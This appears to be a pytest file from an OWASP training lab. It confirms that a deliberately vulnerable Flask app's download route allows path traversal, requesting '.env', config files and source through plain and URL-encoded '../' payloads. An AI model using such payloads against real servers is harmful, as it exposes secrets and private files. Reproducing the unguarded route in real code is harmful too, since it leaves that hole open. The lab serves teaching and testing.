from app_vulnerable import app
import pytest

TRAVERSAL_CASES = {
    ".env": "/download/.env",
    "config.json": "/download/config.json",
    "../app_vulnerable.py": "/download/../app_vulnerable.py",
    "../pyproject.toml": "/download/%2e%2e/pyproject.toml",
    "../../../owasp-top-10-2025-labs.code-workspace": "/download/%2e%2e/%2e%2e/%2e%2e/owasp-top-10-2025-labs.code-workspace",
}


@pytest.mark.parametrize(
    "payload", TRAVERSAL_CASES.values(), ids=TRAVERSAL_CASES.keys()
)
def test_path_traversal_is_possible(payload):
    client = app.test_client()
    response = client.get(payload)
    assert response.status_code == 200
